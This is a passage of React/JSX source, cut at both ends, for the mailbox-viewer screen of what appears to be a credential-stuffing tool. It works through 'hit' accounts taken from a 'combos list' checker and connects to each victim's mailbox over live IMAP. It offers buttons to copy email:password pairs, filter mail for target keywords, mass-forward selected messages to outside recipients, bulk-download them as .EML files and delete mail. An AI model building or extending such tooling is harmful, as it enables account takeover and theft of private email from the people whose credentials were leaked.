                      <div style={{ display: 'flex', alignItems: 'center', gap: '5px', flexWrap: 'wrap' }}>
                        {detectedKws.map((kw, ki) => (
                          <span key={ki} className="badge-purple" style={{ fontSize: '0.64rem', padding: '2px 6px' }}>
                            🎯 {kw}
                          </span>
                        ))}
                      </div>
                    )}

                    {/* Card Bottom Actions */}
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '4px' }}>
                      <button
                        onClick={() => {
                          setSelectedAccount(acc);
                          setSelectedMailId(null);
                        }}
                        className="glass-btn glass-btn-green"
                        style={{
                          flex: 1,
                          justifyContent: 'center',
                          fontSize: '0.75rem',
                          fontWeight: 800,
                          padding: '7px 12px',
                          display: 'flex',
                          alignItems: 'center',
                          gap: '6px'
                        }}
                      >
                        <Inbox size={13} /> Inspect Mailbox ➔
                      </button>

                      {wUrl && (
                        <a
                          href={wUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="glass-btn"
                          style={{ fontSize: '0.72rem', padding: '7px 10px', display: 'flex', alignItems: 'center', gap: '4px', textDecoration: 'none' }}
                          title={`Open ${pName} Webmail`}
                        >
                          <ExternalLink size={12} /> Webmail
                        </a>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          ) : (
            /* Onboarding Deck when 0 hits exist */
            <div className="glass-panel" style={{
              padding: '60px 30px',
              textAlign: 'center',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '16px',
              borderRadius: '16px'
            }}>
              <div style={{
                width: '70px', height: '70px', borderRadius: '50%',
                background: 'linear-gradient(135deg, rgba(0, 229, 255, 0.2), rgba(176, 38, 255, 0.2))',
                border: '1px solid rgba(0, 229, 255, 0.4)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                boxShadow: '0 0 30px rgba(0, 229, 255, 0.2)'
              }}>
                <Mail size={32} color="#00e5ff" />
              </div>
              <div>
                <h3 style={{ fontSize: '1.2rem', fontWeight: 800, color: '#fff', margin: '0 0 6px' }}>
                  No Live Hits In Current Session
                </h3>
                <p style={{ fontSize: '0.8rem', color: '#8b9bb4', maxWidth: '440px', margin: '0 auto', lineHeight: 1.6 }}>
                  Run the bulk checker engine with your combos list to discover valid hits, load verified sample hits for testing, or manually connect a live IMAP mailbox.
                </p>
              </div>

              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap', marginTop: '8px' }}>
                <button
                  onClick={handleLoadVerifiedSampleHits}
                  className="glass-btn glass-btn-green"
                  style={{ fontSize: '0.82rem', padding: '10px 18px', fontWeight: 800 }}
                >
                  ⚡ Load Verified Sample Hits
                </button>
                {setActiveTab && (
                  <button
                    onClick={() => setActiveTab('checker')}
                    className="glass-btn glass-btn-purple"
                    style={{ fontSize: '0.82rem', padding: '10px 18px', fontWeight: 800 }}
                  >
                    <Terminal size={14} /> Go to Checker Studio
                  </button>
                )}
                <button
                  onClick={() => setShowConnectModal(true)}
                  className="glass-btn"
                  style={{ fontSize: '0.82rem', padding: '10px 18px' }}
                >
                  <Plus size={14} /> Connect Manual Hit
                </button>
              </div>
            </div>
          )}
        </div>
      ) : (
        /* Main Authentic Webmail Client Layout (When an account is selected) */
        <div style={{
          display: 'grid',
          gridTemplateColumns: isMaximized ? '1fr' : (showFolders ? '180px 320px 1fr' : '330px 1fr'),
          gap: '12px',
          flex: 1,
          minHeight: 0,
          height: '100%',
          overflow: 'hidden'
        }}>
        
        {/* Left Column: Folders (Inbox, Spam, Trash, Sent) */}
        {!isMaximized && showFolders && (
          <div className="glass-panel" style={{
            padding: '12px',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'space-between',
            height: '100%',
            minHeight: 0,
            overflowY: 'auto',
            overscrollBehavior: 'contain',
            flexShrink: 0
          }}>
          
          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
            <div style={{
              fontSize: '0.64rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace",
              padding: '4px 6px', letterSpacing: '0.5px', borderBottom: '1px solid rgba(255,255,255,0.06)',
              marginBottom: '6px', display: 'flex', justifyContent: 'space-between', alignItems: 'center'
            }}>
              <span>FOLDERS</span>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <span style={{ color: '#00ff9d' }}>{currentAccountMails.length} Total</span>
                <button
                  type="button"
                  onClick={() => setShowFolders(false)}
                  title="Collapse folders panel to enlarge mail viewer"
                  style={{
                    background: 'none', border: 'none', color: '#8b9bb4',
                    cursor: 'pointer', padding: '2px', display: 'flex', alignItems: 'center'
                  }}
                >
                  <PanelLeftClose size={13} />
                </button>
              </div>
            </div>

            {folders.map(f => {
              const Icon = f.icon;
              const count = getFolderCount(f.id);
              const isActive = activeFolder.toLowerCase() === f.id.toLowerCase();
              return (
                <button
                  key={f.id}
                  onClick={() => setActiveFolder(f.id)}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    padding: '10px 12px',
                    borderRadius: '10px',
                    background: isActive ? 'rgba(0,255,157,0.15)' : 'transparent',
                    border: isActive ? '1px solid rgba(0,255,157,0.35)' : '1px solid transparent',
                    color: isActive ? '#fff' : '#8b9bb4',
                    cursor: 'pointer',
                    fontSize: '0.75rem',
                    fontFamily: "'JetBrains Mono', monospace",
                    fontWeight: isActive ? 700 : 400,
                    transition: 'all 0.15s',
                    textAlign: 'left'
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <Icon size={14} color={isActive ? '#00ff9d' : '#64748b'} />
                    <span>{f.name}</span>
                  </div>
                  <span style={{
                    fontSize: '0.65rem',
                    background: isActive ? 'rgba(0,255,157,0.25)' : 'rgba(255,255,255,0.05)',
                    padding: '2px 7px',
                    borderRadius: '10px',
                    color: count > 0 ? (isActive ? '#00ff9d' : '#cbd5e1') : '#64748b',
                    fontWeight: count > 0 ? 700 : 400
                  }}>
                    {count}
                  </span>
                </button>
              );
            })}

            {/* Target hits filter toggle */}
            <div style={{ marginTop: '14px', paddingTop: '14px', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
              <button
                onClick={() => setShowOnlyTargetHits(!showOnlyTargetHits)}
                style={{
                  width: '100%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  padding: '9px 12px',
                  borderRadius: '10px',
                  background: showOnlyTargetHits ? 'rgba(176,38,255,0.2)' : 'rgba(0,0,0,0.3)',
                  border: showOnlyTargetHits ? '1px solid #b026ff' : '1px solid rgba(255,255,255,0.08)',
                  color: showOnlyTargetHits ? '#fff' : '#8b9bb4',
                  cursor: 'pointer',
                  fontSize: '0.72rem',
                  fontFamily: "'JetBrains Mono', monospace"
                }}
              >
                <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <Tag size={13} color="#b026ff" /> Target Hits Only
                </span>
                <span style={{ background: '#b026ff', color: '#fff', padding: '1px 6px', borderRadius: '8px', fontSize: '0.65rem', fontWeight: 700 }}>
                  {totalTargetHitsCount}
                </span>
              </button>
            </div>
          </div>

          {/* Account Details Box */}
          <div style={{
            background: 'rgba(0,0,0,0.4)',
            border: '1px solid rgba(255,255,255,0.08)',
            padding: '12px',
            borderRadius: '12px',
            fontSize: '0.68rem',
            fontFamily: "'JetBrains Mono', monospace",
            display: 'flex',
            flexDirection: 'column',
            gap: '8px',
            marginTop: '16px'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: '#00ff9d', fontWeight: 700 }}>
              <ShieldCheck size={14} /> REAL IMAP LINKED
            </div>
            <div style={{ color: '#8b9bb4' }}>
              Host: <span style={{ color: '#fff' }}>{imapConfig.host}</span><br />
              Port: <span style={{ color: '#00e5ff' }}>{imapConfig.port} (SSL/TLS)</span>
            </div>
            {selectedAccount && (
              <div style={{ color: '#8b9bb4', wordBreak: 'break-all', display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <div>
                  Account: <span style={{ color: '#fff', fontWeight: 700, userSelect: 'all' }}>
                    {selectedAccount}{password ? `:${password}` : ''}
                  </span>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', marginTop: '2px' }}>
                  <button
                    onClick={() => {
                      const textToCopy = password ? `${selectedAccount}:${password}` : selectedAccount;
                      navigator.clipboard?.writeText(textToCopy);
                      setToastMessage({ type: 'success', text: `Copied combo: ${textToCopy}` });
                      setTimeout(() => setToastMessage(null), 2500);
                    }}
                    className="glass-btn glass-btn-green"
                    style={{ fontSize: '0.64rem', padding: '3px 8px', display: 'inline-flex', alignItems: 'center', gap: '4px', cursor: 'pointer' }}
                    title="Copy email:password combo"
                  >
                    <Copy size={11} /> Copy Combo
                  </button>
                  {password && (
                    <button
                      onClick={() => {
                        navigator.clipboard?.writeText(password);
                        setToastMessage({ type: 'success', text: `Copied password!` });
                        setTimeout(() => setToastMessage(null), 2500);
                      }}
                      className="glass-btn"
                      style={{ fontSize: '0.64rem', padding: '3px 8px', display: 'inline-flex', alignItems: 'center', gap: '4px', cursor: 'pointer' }}
                      title="Copy password only"
                    >
                      <Key size={11} /> Pass
                    </button>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
        )}

        {/* Middle Column: Email List */}
        {!isMaximized && (
        <div className="glass-panel" style={{
          padding: '14px',
          display: 'flex',
          flexDirection: 'column',
          height: '100%',
          minHeight: 0,
          overflow: 'hidden',
          flexShrink: 0
        }}>
          
          {/* Active Mailbox Banner on top of mail list (Clean 2-row layout with zero truncation) */}
          <div style={{
            padding: '6px 8px',
            background: 'rgba(0, 255, 157, 0.08)',
            border: '1px solid rgba(0, 255, 157, 0.25)',
            borderRadius: '8px',
            marginBottom: '8px',
            display: 'flex',
            flexDirection: 'column',
            gap: '4px',
            flexShrink: 0
          }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '6px', overflow: 'hidden' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '6px', overflow: 'hidden' }}>
                {!showFolders && (
                  <button
                    type="button"
                    onClick={() => setShowFolders(true)}
                    title="Show folders panel"
                    className="glass-btn"
                    style={{ padding: '2px 5px', fontSize: '0.62rem', display: 'flex', alignItems: 'center', gap: '3px', color: '#00e5ff', borderColor: 'rgba(0,229,255,0.3)', flexShrink: 0 }}
                  >
                    <PanelLeftOpen size={11} /> Folders
                  </button>
                )}
                <span style={{ fontSize: '0.62rem', color: '#00ff9d', fontWeight: 800, fontFamily: "'JetBrains Mono', monospace", whiteSpace: 'nowrap' }}>
                  HIT:
                </span>
                <span style={{ fontSize: '0.72rem', color: '#fff', fontWeight: 700, fontFamily: "'JetBrains Mono', monospace", overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', userSelect: 'all' }} title={password ? `${selectedAccount}:${password}` : selectedAccount}>
                  {selectedAccount ? `${selectedAccount}${password ? `:${password}` : ''}` : 'None'}
                </span>
              </div>
              {selectedAccount && (
                <button
                  onClick={() => {
                    const text = password ? `${selectedAccount}:${password}` : selectedAccount;
                    navigator.clipboard?.writeText(text);
                    setToastMessage({ type: 'success', text: `Copied combo: ${text}` });
                    setTimeout(() => setToastMessage(null), 2500);
                  }}
                  className="glass-btn"
                  style={{ fontSize: '0.6rem', padding: '2px 6px', display: 'inline-flex', alignItems: 'center', gap: '3px', flexShrink: 0 }}
                  title="Copy email:pass"
                >
                  <Copy size={10} />
                </button>
              )}
            </div>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '6px', paddingTop: '3px', borderTop: '1px solid rgba(255,255,255,0.04)' }}>
              <button
                onClick={() => handleFetchAllRealFolders(selectedAccount, password, false, 100)}
                disabled={isFetchingLive || !selectedAccount}
                className="glass-btn glass-btn-green"
                style={{ fontSize: '0.64rem', padding: '2px 8px', display: 'flex', alignItems: 'center', gap: '4px', fontWeight: 700 }}
                title="Check for new incoming emails right now"
              >
                <RefreshCw size={10} className={isFetchingLive ? 'animate-spin' : ''} />
                {isFetchingLive ? 'Checking...' : 'Refresh'}
              </button>
              <span style={{ fontSize: '0.62rem', color: '#00e5ff', background: 'rgba(0, 229, 255, 0.15)', padding: '2px 6px', borderRadius: '4px', fontFamily: "'JetBrains Mono', monospace" }}>
                {filteredMails.length} msgs &bull; P{currentPage}/{totalPages}
              </span>
            </div>
          </div>

          {/* Search bar */}
          <div style={{ position: 'relative', marginBottom: '10px', flexShrink: 0 }}>
            <input 
              type="text" 
              placeholder={`Filter in ${activeFolder}...`}
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="glass-input" 
              style={{ fontSize: '0.75rem', paddingLeft: '32px', width: '100%' }} 
            />
            <Search size={14} color="#8b9bb4" style={{ position: 'absolute', left: '10px', top: '11px' }} />
            {searchQuery && (
              <button 
                onClick={() => setSearchQuery('')}
                style={{ position: 'absolute', right: '10px', top: '8px', background: 'none', border: 'none', color: '#8b9bb4', cursor: 'pointer' }}
              >
                ✕
              </button>
            )}
          </div>

          {/* Multi-Selection Action Toolbar (Zero-clipping 2-row layout when selected) */}
          <div style={{
            display: 'flex',
            flexDirection: 'column',
            gap: '6px',
            marginBottom: '8px',
            padding: '6px 8px',
            background: selectedMailIds.size > 0 ? 'rgba(0, 255, 157, 0.08)' : 'rgba(255,255,255,0.02)',
            borderRadius: '8px',
            border: `1px solid ${selectedMailIds.size > 0 ? 'rgba(0, 255, 157, 0.3)' : 'rgba(255,255,255,0.05)'}`,
            fontSize: '0.68rem',
            color: '#8b9bb4',
            flexShrink: 0
          }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '6px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <input
                  type="checkbox"
                  checked={selectedMailIds.size > 0 && selectedMailIds.size === filteredMails.length}
                  onChange={handleSelectAllFiltered}
                  style={{ cursor: 'pointer', accentColor: '#00ff9d' }}
                  title="Select all messages on current filter"
                />
                <span style={{ fontWeight: 600, color: selectedMailIds.size > 0 ? '#00ff9d' : '#8b9bb4' }}>
                  {selectedMailIds.size > 0 ? `${selectedMailIds.size} Selected` : 'Select All'}
                </span>
              </div>
              {selectedMailIds.size === 0 ? (
                <span style={{ fontSize: '0.62rem', color: '#64748b' }}>
                  {filteredMails.length > 0 ? `${startIndex + 1}-${endIndex} of ${filteredMails.length}` : '0 messages'}
                </span>
              ) : (
                <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                  {totalTargetHitsCount > 0 && (
                    <button
                      onClick={handleSelectTargetHits}
                      className="glass-btn glass-btn-purple"
                      style={{ fontSize: '0.6rem', padding: '2px 5px' }}
                      title="Select all messages that hit target keywords"
                    >
                      🎯 Hits ({totalTargetHitsCount})
                    </button>
                  )}
                  <button
                    onClick={handleClearSelection}
                    className="glass-btn"
                    style={{ fontSize: '0.65rem', padding: '2px 6px', color: '#ef4444' }}
                    title="Clear Selection"
                  >
                    ✕
                  </button>
                </div>
              )}
            </div>

            {selectedMailIds.size > 0 && (
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px', paddingTop: '4px', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                <button
                  onClick={() => {
                    setMassForwardRecipients('');
                    setMassForwardNote('');
                    setMassForwardResult(null);
                    setShowMassForwardModal(true);
                  }}
                  className="glass-btn glass-btn-green"
                  style={{ fontSize: '0.65rem', padding: '3px 8px', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '3px', flex: 1, justifyContent: 'center' }}
                  title="Mass Forward or Relay selected emails"
                >
                  <Send size={11} /> Mass Forward
                </button>
                <button
                  onClick={handleMassCopyText}
                  className="glass-btn"
                  style={{ fontSize: '0.65rem', padding: '3px 6px' }}
                  title="Copy all selected emails to clipboard"
                >
                  <Copy size={11} /> Copy
                </button>
                <button
                  onClick={handleMassDownloadZip}
                  className="glass-btn"
                  style={{ fontSize: '0.65rem', padding: '3px 6px' }}
                  title="Download all selected emails as .EML bundle"
                >
                  <Download size={11} /> .EML
                </button>
              </div>
            )}
          </div>

          {/* Email Item Cards Scroll */}
          <div 
            ref={mailListContainerRef}
            style={{
              flex: 1,
              minHeight: 0,
              overflowY: 'auto',
              overscrollBehavior: 'contain',
              display: 'flex',
              flexDirection: 'column',
              gap: '8px',
              paddingRight: '4px'
            }}
          >
            {paginatedMails.length === 0 ? (
              <div style={{ padding: '60px 16px', textAlign: 'center', fontSize: '0.75rem', color: '#8b9bb4' }}>
                <Mail size={36} color="rgba(255,255,255,0.15)" style={{ margin: '0 auto 12px' }} />
                No real emails found in "{activeFolder}".<br />
                {selectedAccount ? (
                  <button
                    onClick={() => handleFetchAllRealFolders(selectedAccount, password, false, 100)}
                    className="glass-btn glass-btn-purple"
                    style={{ fontSize: '0.72rem', marginTop: '12px', padding: '6px 12px' }}
                  >
                    Sync Live IMAP Now
                  </button>
                ) : 'Select a valid hit account from the top bar.'}
              </div>
            ) : paginatedMails.map((mail, idx) => {
              const isSelected = activeMail?.id === mail.id;
              const hasHits = mail.matchedTargets && mail.matchedTargets.length > 0;
              const isChecked = selectedMailIds.has(mail.id);
              const safeKey = mail.id ? `${mail.id}-${idx}` : `mail-${idx}`;

              return (
                <div 
                  key={safeKey} 
                  onClick={() => setSelectedMailId(mail.id)}
                  style={{
                    padding: '12px 14px', 
                    borderRadius: '12px', 
                    cursor: 'pointer', 
                    transition: 'all 0.15s',
                    background: isChecked ? 'rgba(0, 255, 157, 0.08)' : (isSelected ? 'rgba(0, 229, 255, 0.12)' : 'rgba(0,0,0,0.35)'),
                    border: isChecked ? '1px solid #00ff9d' : (isSelected ? '1px solid #00e5ff' : '1px solid rgba(255,255,255,0.06)'),
                    boxShadow: isSelected ? '0 0 16px rgba(0, 229, 255, 0.2)' : 'none',
                    position: 'relative'
                  }}
                >
                  {/* Unread indicator */}
                  {mail.isUnread && (
                    <span style={{
                      position: 'absolute', top: '14px', left: '4px',
                      width: '6px', height: '6px', borderRadius: '50%',
                      background: '#00ff9d', boxShadow: '0 0 6px #00ff9d'
                    }} />
                  )}

                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px', paddingLeft: mail.isUnread ? '8px' : '0' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', maxWidth: '75%' }}>
                      <input
                        type="checkbox"
                        checked={isChecked}
                        onChange={(e) => toggleSelectMail(mail.id, e)}
                        onClick={(e) => e.stopPropagation()}
                        style={{ cursor: 'pointer', accentColor: '#00ff9d' }}
                      />
                      <span style={{
                        fontSize: '0.76rem',
                        fontWeight: mail.isUnread ? 800 : 600,
                        color: mail.isUnread ? '#fff' : '#cbd5e1',
                        overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap'
                      }}>
                        {mail.sender}
                      </span>
                    </div>
                    <span style={{ fontSize: '0.65rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                      {mail.date}
                    </span>
                  </div>

                  <h4 style={{
                    fontSize: '0.76rem',
                    color: hasHits ? '#00ff9d' : '#e2e8f0',
                    fontWeight: mail.isUnread ? 700 : 500,
                    marginBottom: '4px',
                    overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                    paddingLeft: mail.isUnread ? '8px' : '0'
                  }}>
                    {mail.subject}
                  </h4>

                  <p style={{
                    fontSize: '0.68rem', color: '#8b9bb4',
                    fontFamily: "'JetBrains Mono', monospace",
                    overflow: 'hidden', display: '-webkit-box', WebkitLineClamp: 2, WebkitBoxOrient: 'vertical',
                    marginBottom: '6px', lineHeight: 1.4,
                    paddingLeft: mail.isUnread ? '8px' : '0'
                  }}>
                    {mail.snippet}
                  </p>

                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: '4px', borderTop: '1px solid rgba(255,255,255,0.03)' }}>
                    <span style={{ fontSize: '0.6rem', color: '#64748b', background: 'rgba(255,255,255,0.04)', padding: '1px 6px', borderRadius: '4px' }}>
                      📂 {mail.folder}
                    </span>

                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                      {mail.attachments?.length > 0 && (
                        <Paperclip size={11} color="#38bdf8" />
                      )}
                      {hasHits ? (
                        <div style={{ display: 'flex', gap: '3px' }}>
                          {mail.matchedTargets.map((t, i) => (
                            <span key={i} style={{ background: 'rgba(0,255,157,0.15)', color: '#00ff9d', border: '1px solid rgba(0,255,157,0.3)', fontSize: '0.58rem', padding: '1px 5px', borderRadius: '4px', fontWeight: 700 }}>
                              🎯 {t}
                            </span>
                          ))}
                        </div>
                      ) : null}
                      {mail.forensicAnalysis?.wasObfuscated && (
                        <span style={{
                          background: 'rgba(176,38,255,0.2)',
                          color: '#d8b4fe',
                          border: '1px solid rgba(176,38,255,0.45)',
                          fontSize: '0.58rem',
                          padding: '1px 5px',
                          borderRadius: '4px',
                          fontWeight: 700,
                          display: 'inline-flex',
                          alignItems: 'center',
                          gap: '3px'
                        }} title="Decoded obfuscated payload detected">
                          <ShieldAlert size={9} color="#d8b4fe" /> FORENSICS
                        </span>
                      )}

                      {/* Quick Delete action on list item */}
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleDeleteAction(mail);
                        }}
                        style={{
                          background: 'none',
                          border: 'none',
                          color: '#64748b',
                          cursor: 'pointer',
                          padding: '2px 4px',
                          borderRadius: '4px',
                          display: 'flex',
                          alignItems: 'center',
                          transition: 'color 0.15s'
                        }}
                        onMouseEnter={(e) => { e.currentTarget.style.color = '#ef4444'; }}
                        onMouseLeave={(e) => { e.currentTarget.style.color = '#64748b'; }}
                        title={mail.folder?.toLowerCase() === 'trash' ? "Permanently remove message" : "Move message to Trash"}
                      >
                        <Trash2 size={12} />
                      </button>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Bottom Pagination Bar & Dig Deeper (Zero-clipping compact layout) */}
          <div style={{
            marginTop: '8px',
            padding: '6px 8px',
            background: 'rgba(0, 0, 0, 0.45)',
            border: '1px solid rgba(255, 255, 255, 0.08)',
            borderRadius: '10px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            gap: '6px',
            flexShrink: 0
          }}>
            {/* Left: Range and Count */}
            <div style={{
              fontSize: '0.66rem',
              fontFamily: "'JetBrains Mono', monospace",
              color: '#8b9bb4',
              display: 'flex',
              alignItems: 'center',
              gap: '3px',
              flexShrink: 0
            }}>
              <span style={{ color: '#00ff9d', fontWeight: 700 }}>
                {filteredMails.length > 0 ? `${startIndex + 1}-${endIndex}` : '0'}
              </span>
              <span>/</span>
              <span style={{ color: '#fff', fontWeight: 700 }}>
                {filteredMails.length}
              </span>
            </div>

            {/* Center / Right: Arrows, Page Info & Dig Deeper */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '4px', flexShrink: 0 }}>
              {/* Previous Page Arrow */}
              <button
                onClick={() => handlePageChange(currentPage - 1)}
                disabled={currentPage === 1}
                className="glass-btn"
                style={{
                  padding: '4px 6px',
                  fontSize: '0.68rem',
                  opacity: currentPage === 1 ? 0.35 : 1,
                  cursor: currentPage === 1 ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: '#fff',
                  border: '1px solid rgba(255, 255, 255, 0.12)'
                }}
                title="Previous 50 emails"
              >
                <ChevronLeft size={13} />
              </button>

              {/* Page indicator */}
              <div style={{
                padding: '2px 6px',
                borderRadius: '6px',
                background: 'rgba(0, 229, 255, 0.12)',
                border: '1px solid rgba(0, 229, 255, 0.3)',
                color: '#00e5ff',
                fontSize: '0.64rem',
                fontWeight: 700,
                fontFamily: "'JetBrains Mono', monospace",
                whiteSpace: 'nowrap'
              }}>
                {currentPage}/{totalPages}
              </div>

              {/* Next Page Arrow */}
              <button
                onClick={() => handlePageChange(currentPage + 1)}
                disabled={currentPage >= totalPages}
                className="glass-btn"
                style={{
                  padding: '4px 6px',
                  fontSize: '0.68rem',
                  opacity: currentPage >= totalPages ? 0.35 : 1,
                  cursor: currentPage >= totalPages ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: '#fff',
                  border: '1px solid rgba(255, 255, 255, 0.12)'
                }}
                title="Next 50 emails"
              >
                <ChevronRight size={13} />
              </button>

              {/* Dig Deeper / Load More From Server */}
              <button
                onClick={() => handleFetchAllRealFolders(selectedAccount, password, false, 250)}
                disabled={isFetchingLive || !selectedAccount}
                className="glass-btn glass-btn-purple"
                style={{
                  padding: '3px 7px',
                  fontSize: '0.64rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '3px',
                  fontWeight: 700
                }}
                title="Dig deeper into IMAP mailbox on server to load 250+ messages across all folders"
              >
                <RefreshCw size={10} className={isFetchingLive ? 'animate-spin' : ''} />
                <span>{isFetchingLive ? 'Digging...' : 'Dig 250+'}</span>
              </button>
            </div>
          </div>
        </div>
        )}

        {/* Right Column: Real Email Content Viewer */}
        <div className="glass-panel" style={{
          padding: '12px 14px',
          display: 'flex',
          flexDirection: 'column',
          height: '100%',
          flex: 1,
          minHeight: 0,
          overflow: 'hidden',
          boxShadow: isMaximized ? '0 0 35px rgba(0, 229, 255, 0.25)' : undefined
        }}>
          {activeMail ? (
            <>
              {/* Pinned Hit Account Identifier on top of viewer */}
              <div style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                background: 'linear-gradient(90deg, rgba(176,38,255,0.18), rgba(0,255,157,0.12))',
                border: '1px solid rgba(0, 255, 157, 0.35)',
                borderRadius: '8px',
                padding: '5px 12px',
                marginBottom: '8px',
                flexShrink: 0
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', overflow: 'hidden' }}>
                  <span style={{
                    fontSize: '0.62rem',
                    fontWeight: 800,
                    fontFamily: "'JetBrains Mono', monospace",
                    color: '#00ff9d',
                    letterSpacing: '0.5px',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '4px',
                    whiteSpace: 'nowrap'
                  }}>
                    <ShieldCheck size={13} color="#00ff9d" /> HIT MAILBOX:
                  </span>
                  <span style={{
                    fontSize: '0.78rem',
                    fontWeight: 800,
                    color: '#ffffff',
                    fontFamily: "'JetBrains Mono', monospace",
                    overflow: 'hidden',
                    textOverflow: 'ellipsis',
                    whiteSpace: 'nowrap',
                    userSelect: 'all'
                  }}>
                    {(selectedAccount || activeMail.email)}{password ? `:${password}` : ''}
                  </span>
                  <span style={{
                    fontSize: '0.58rem',
                    padding: '1px 6px',
                    borderRadius: '5px',
                    background: 'rgba(0, 229, 255, 0.15)',
                    color: '#00e5ff',
                    border: '1px solid rgba(0, 229, 255, 0.3)',
                    whiteSpace: 'nowrap',
                    fontWeight: 600,
                    fontFamily: "'JetBrains Mono', monospace"
                  }}>
                    {providerName} &bull; {imapConfig.host}:993
                  </span>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexShrink: 0 }}>
                  <button
                    onClick={() => {
                      const activeEmail = selectedAccount || activeMail.email;
                      const text = password ? `${activeEmail}:${password}` : activeEmail;
                      navigator.clipboard?.writeText(text);
                      setToastMessage({ type: 'success', text: `Copied combo: ${text}` });
                      setTimeout(() => setToastMessage(null), 2500);
                    }}
                    className="glass-btn glass-btn-green"
                    style={{ fontSize: '0.62rem', padding: '2px 7px', display: 'flex', alignItems: 'center', gap: '3px' }}
                    title="Copy email:password combo"
                  >
                    <Copy size={10} /> Copy Combo
                  </button>
                  <span style={{ fontSize: '0.62rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace" }}>
                    {filteredMails.findIndex(m => m.id === activeMail.id) + 1} / {filteredMails.length}
                  </span>
                </div>
              </div>

              {/* Webmail Toolbar & Header */}
              <div style={{ borderBottom: '1px solid rgba(255,255,255,0.08)', paddingBottom: '8px', marginBottom: '8px', flexShrink: 0 }}>
                
                {/* Top Toolbar Row */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px', flexWrap: 'wrap', gap: '6px' }}>
                  
                  {/* Quick Webmail Actions */}
                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <button 
                      onClick={() => handleOpenForward(true)}
                      className="glass-btn" 
                      style={{ fontSize: '0.72rem', padding: '5px 10px', display: 'flex', alignItems: 'center', gap: '4px' }}
                      title="Reply to sender"
                    >
                      <CornerUpLeft size={13} /> Reply
                    </button>
                    <button 
                      onClick={() => handleOpenForward(false)}
                      className="glass-btn" 
                      style={{ fontSize: '0.72rem', padding: '5px 10px', display: 'flex', alignItems: 'center', gap: '4px' }}
                      title="Forward message to another email"
                    >
                      <CornerUpRight size={13} /> Forward
                    </button>
                    <button 
                      onClick={() => {
                        if (iframeRef.current?.contentWindow) {
                          iframeRef.current.contentWindow.print();
                        } else {
                          window.print();
                        }
                      }}
                      className="glass-btn" 
                      style={{ fontSize: '0.72rem', padding: '5px 10px', display: 'flex', alignItems: 'center', gap: '4px' }}
                      title="Print this message"
                    >
                      <Printer size={13} /> Print
                    </button>
                    <button 
                      onClick={() => handleDeleteAction(activeMail)} 
                      disabled={isDeleting}
                      className="glass-btn glass-btn-danger" 
                      style={{ fontSize: '0.72rem', padding: '5px 10px', display: 'flex', alignItems: 'center', gap: '4px', opacity: isDeleting ? 0.6 : 1 }}
                      title={activeMail.folder?.toLowerCase() === 'trash' ? "Permanently expunge from mailbox" : "Move to Trash folder"}
                    >
                      <Trash2 size={13} /> {isDeleting ? 'Deleting...' : (activeMail.folder?.toLowerCase() === 'trash' ? 'Delete Permanently' : 'Delete')}
                    </button>

                    <button 
                      onClick={() => handleFetchAllRealFolders(selectedAccount, password)}
                      disabled={isFetchingLive || !selectedAccount}
                      className="glass-btn" 
